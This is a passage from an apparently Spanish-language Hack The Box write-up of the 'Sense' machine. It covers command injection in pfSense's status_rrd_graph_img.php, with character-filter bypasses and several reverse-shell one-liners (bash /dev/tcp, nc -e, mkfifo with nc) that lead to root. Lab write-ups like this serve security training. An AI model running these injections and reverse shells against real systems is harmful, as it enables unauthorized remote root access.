+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer    : pfSense.localdomain
+</span></span><span style="display:flex;"><span>OS          : FreeBSD pfSense.localdomain 8.3-RELEASE-p16 FreeBSD 8.3-RELEASE-p16 <span style="color:#75715e">#0: Thu May  1 16:19:14 EDT 2014     root@pf2_1_1_amd64.pfsense.org:/usr/obj.amd64/usr/pfSensesrc/src/sys/pfSense_SMP.8 amd64</span>
+</span></span><span style="display:flex;"><span>Meterpreter : php/freebsd
+</span></span><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">16138</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">0</span> created.
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, ganamos acceso con <strong>Metasploit</strong>.</p>
+<h3 id="PruebaExp4">Inyectando Comandos en status_rrd_graph_img.php de pfSense</h3>
+<p>Existe un blog que explica como inyectar comandos en un <strong>archivo PHP</strong> de <strong>pfSense</strong>, te lo comparto:</p>
+<ul>
+<li><a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" target="_blank">PfSense Vulnerabilities Part 2: Command Injection</a></li>
+</ul>
+<p>De acuerdo al blog, nosotros podemos usar el <strong>archivo status_rrd_graph_img.php</strong> para inyectar comandos, dentro de ese script, la variable <strong>exec()</strong> es la que presenta la vulnerabilidad, entonces, según el blog podemos usar el <strong>parámetro queues</strong> para inyectar nuestro comando, dentro del <strong>parámetro GET database</strong>.</p>
+<p>Vamos a tratar de inyectar un comando de prueba, siguiendo los pasos que menciona el blog:</p>
+<ul>
+<li>Captura una sesión con <strong>BurpSuite</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura10.png">
+</p>
+<ul>
+<li>Envia la captura al <strong>Repeater</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura11.png">
+</p>
+<ul>
+<li>Vamos a replicar lo mismo que hicieron en el blog, pondremos los comandos para crear un <strong>archivo txt</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura12.png">
+</p>
+<ul>
+<li>Entra en la URL para ver el archivo de texto:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura13.png">
+</p>
+<p>De esta forma comprobamos que, podemos inyectar comandos, vamos a intentar conectarnos a la máquina inyectando una <strong>Reverse Shell</strong>.</p>
+<hr>
+<p><strong>IMPORTANTE</strong>: Por lo que entiendo del blog, es necesario que la inyección sea usando bash, es decir, que no podemos incluir un <strong>archivo PHP</strong> con una <strong>cmd</strong> como lo hemos hecho antes. E incluso, parece que estamos limitados en cuanto a caracteres se refiere, pues uno de los caracteres que impedira la ejecución de nuestros comandos, será el <strong>slash (/)</strong>, por lo que debemos buscar una alternativa y ver si hay otros caracteres que impediran la ejecución de nuestros comandos.</p>
+<hr>
+<p>Para lograr esto, podemos utilizar <strong>netcat</strong> con el fin de ver que caracteres y comandos funcionan, ya que ni el código fuente ni el render, nos muestran si fue correcta nuestra inyección.</p>
+<p>Esto igual lo haremos por pasos:</p>
+<ul>
+<li>Abre una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Probemos a mandar un <strong>comando whoami</strong> a nuestra <strong>netcat</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura14.png">
+</p>
+<ul>
+<li>Observa la <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.60<span style="color:#f92672">]</span> <span style="color:#ae81ff">2768</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Excelente, de momento funciona.</p>
+<p>Para no alargar más esta parte del blog, te cuento que los caracteres que no funcionan son: <strong>slash(/), ampersand(&amp;) y el guion (-)</strong>.</p>
+<p>Para el caso del <strong>slash(/)</strong>, podemos usar el <strong>comando env</strong>, para poder ver las variables de entorno que tiene la máquina víctima:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura15.png">
+</p> 
+<p>Observa el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.60<span style="color:#f92672">]</span> <span style="color:#ae81ff">63944</span>
+</span></span><span style="display:flex;"><span>OLDPWD<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>HOME<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>PHP_FCGI_MAX_REQUESTS<span style="color:#f92672">=</span><span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin
+</span></span><span style="display:flex;"><span>LANG<span style="color:#f92672">=</span>en_US.ISO8859-1
+</span></span><span style="display:flex;"><span>PHP_FCGI_CHILDREN<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>PWD<span style="color:#f92672">=</span>/var/db/rrd
+</span></span></code></pre></div><p>Entonces, si usamos <strong>HOME</strong> dentro de nuestra inyección, será igual al <strong>slash(/)</strong>, probemoslo:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura16.png">
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.60<span style="color:#f92672">]</span> <span style="color:#ae81ff">10532</span>
+</span></span><span style="display:flex;"><span>/
+</span></span></code></pre></div><p>Y listo, de esta forma podemos usar el <strong>slash(/)</strong>, para el <strong>ampersand(&amp;) y guion(-)</strong> la cosa cambia, porque no tenemos una variable de entorno a la cual referenciar. Para solucionar esto, podemos usar su código ASCII dentro de una varible de bash, lo que permitira usar estos dos caracteres.</p>
+<ul>
+<li>
+<p>Para el <strong>ampersand(&amp;)</strong> en <strong>ASCII</strong> es: <em>\046</em></p>
+</li>
+<li>
+<p>Para el <strong>guion(-)</strong> en <strong>ASCII</strong> es: <em>\055</em></p>
+</li>
+</ul>
+<p>Intenta a meterlos en una variable cada uno, y ejecutalo en una inyección de comandos para ver si funcionan:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura17.png">
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.60<span style="color:#f92672">]</span> <span style="color:#ae81ff">38798</span>
+</span></span><span style="display:flex;"><span>- &amp;
+</span></span></code></pre></div><p>Excelente, ahora solo es cuestión de ocupar una <strong>Reverse Shell</strong> que nos permita ganar acceso a la máquina, suplantando los caracteres especiales que no interpreta por lo que ya tenemos.</p>
+<p>En mi caso, probe las siguientes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-&gt; bash -i &gt;&amp; /dev/tcp/Tu_IP/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-&gt; nc Tu_IP <span style="color:#ae81ff">443</span> -e bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-&gt; exec 5&lt;&gt;/dev/tcp/Tu_IP/443;cat &lt;&amp;<span style="color:#ae81ff">5</span> | <span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> $line 2&gt;&amp;<span style="color:#ae81ff">5</span> &gt;&amp;5; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Y ninguna funciono a excepción de esta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc Tu_IP <span style="color:#ae81ff">443</span> &gt;/tmp/f
+</span></span></code></pre></div><p>Quiero pensar, que esta se acomoda perfectamente a como funciona la vulnerabilidad encontrada, pues mencionan algo de que se va a ejecutar cualquier comando que inyectes, después del <strong>comando rm</strong> del <strong>script status_rrd_graph_img.php</strong> hasta que metas un <strong>slash(/)</strong>, que es cuando ya no se ejecuta nada.</p>
+<p>Probemos esta <strong>Reverse Shell</strong>, por pasos:</p>
+<ul>
+<li>Abre una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Utiliza la <strong>Reverse Shell</strong> que mencione y cambia los caracteres especiales, por los que encontramos:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura18.png">
+</p>
+<ul>
+<li>Observa la <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.60<span style="color:#f92672">]</span> <span style="color:#ae81ff">4360</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Y listo, hemos vuelto a ganar acceso y completado la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.112122" target="_blank" rel="noopener noreferrer">http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.112122</a></li><li><a href="https://www.pinguytaz.net/index.php/2019/10/18/wfuzz-navaja-suiza-del-pentesting-web-1-3/" target="_blank" rel="noopener noreferrer">https://www.pinguytaz.net/index.php/2019/10/18/wfuzz-navaja-suiza-del-pentesting-web-1-3/</a></li><li><a href="https://www.exploit-db.com/exploits/38780" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/38780</a></li><li><a href="https://www.exploit-db.com/exploits/34113" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/34113</a></li><li><a href="https://www.exploit-db.com/exploits/43560" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/43560</a></li><li><a href="https://www.weweb.cat/es/silverstripe-cms/" target="_blank" rel="noopener noreferrer">https://www.weweb.cat/es/silverstripe-cms/</a></li><li><a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" target="_blank" rel="noopener noreferrer">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/</a></li><li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener noreferrer">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li><li><a href="https://www.youtube.com/watch?v=mWTmXpQlgCs" target="_blank" rel="noopener noreferrer">https://www.youtube.com/watch?v=mWTmXpQlgCs</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-shocker/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Shocker - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/WiFi-Notes1/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Hacking WiFi - Modo Monitor y Falsificación de MAC de una Tarjeta de Red</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
